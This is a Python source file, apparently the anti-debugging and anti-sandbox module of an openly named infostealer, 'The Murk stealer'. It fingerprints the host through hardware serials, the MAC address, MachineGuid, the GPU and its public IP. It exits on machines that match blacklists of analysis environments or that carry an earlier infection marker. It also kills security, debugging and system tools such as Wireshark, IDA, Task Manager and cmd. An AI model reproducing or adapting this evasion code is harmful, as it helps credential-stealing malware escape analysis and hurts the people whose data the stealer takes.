#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import _exit, environ, sep, getenv
from os.path import exists
from subprocess import check_output, PIPE
from psutil import cpuinfo, process_iter
from uuid import UUID, getnode
from wmi import WMI
from subprocess import check_output
from requests import DEVNULL, get
from platform import system
from json import loads
from manager.blacklist import BlackList
from manager.logger import Log




kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

def checkHWID():
    try:
        return check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        return "No data"


def checkMAC():
    try:
        mac = UUID(int=getnode()).hex[-12:]
        return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
    except:
        return "No data"
    


def checkBIOS():
    try:
        c = WMI()
        bios = c.Win32_BIOS()[0]
        return bios.SerialNumber.strip()
    except:
        return "No data"


def checkManufacture():
    try:
        c = WMI()
        baseboard = c.Win32_BaseBoard()[0]
        return baseboard.Manufacturer.strip()
    except:
        return "No data"


def checkBASE():
    try:
        wmi_service = WMI()
        baseboards = wmi_service.Win32_BaseBoard()
        return  baseboards[0].SerialNumber
    except:
        return "No data"
    


def checkCPU():
    try:
        cpu_info = cpuinfo()
        return cpu_info[0].serial
    except:
        return "No data"



def checkDrive():
    try:
        c = WMI()
        drives = c.Win32_DiskDrive()
        return drives[0].SerialNumber.strip()
    except:
        return "No data"


def checkHW_profile():
    try:
        c = WMI()
        hw_profiles = c.Win32_SystemDriver()
        for profile in hw_profiles:
            if profile.DisplayName == 'HW Profile GUID':
                return profile.Description.strip()
        return "No data"
    except:
        return "No data"


def checkGUID():
    try:
        output = check_output(['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], stderr=DEVNULL)
        lines = output.decode().split('\n')
        for line in lines:
            if 'MachineGuid' in line:
                _, guid = line.split()
            return guid.strip()
        return "No data"
    except:
        return "No data"



def checkGPU():
    try:
        c = WMI()
        gpu_info = []
        for gpu in c.Win32_VideoController():
            gpu_info.append((gpu.Name))
        return gpu_info
    except:
        return []




def checkIP():
    try:
        return loads(get('https://ipinfo.io/json').text)['ip']
    except:
        return "No data"


def checkPlatform():
    try:
        return system()
    except:
        return "No data"









def AntiDebug(oneStart):
    pathf =  environ['USERPROFILE'] +  sep + r'AppData\Local'
    
    if oneStart:
        if (exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
             _exit(0)

    if  exists(rf'{pathf}\windll'):
         _exit(0)

    processlist = process_iter(['name'])

    if  getenv("USERPROFILE") in BlackList.Users:
         _exit(0)


    if  getenv('COMPUTERNAME') in BlackList.PC_Name:
         _exit(0)


    if checkHWID() in BlackList.HWID:
         _exit(0)


    if checkMAC() in BlackList.Mac_Address:
         _exit(0)

    if checkBIOS() in BlackList.Bios:
         _exit(0)

    
    if checkManufacture() in BlackList.Manufacture:
         _exit(0)


    if checkBASE() in BlackList.BaseBoard:
         _exit(0)


    if checkCPU() in BlackList.CPU:
         _exit(0)


    if checkDrive() in BlackList.Drive:
         _exit(0)


    if checkHW_profile() in BlackList.HW_Profile_GUID:
         _exit(0)
 


    if checkGUID() in BlackList.Machine_GUID:
         _exit(0)

    gpus = checkGPU()
    for gpu in gpus:
        if gpu in BlackList.GPU:
             _exit(0)

    if checkIP() in BlackList.ip:
         _exit(0)

    if checkPlatform() in BlackList.Platform:
         _exit(0)
    
    for proc in processlist:
            if any(procstr in proc.name().lower() for procstr in kill_Processes):
                try:
                    proc.kill()
                except:
                    pass
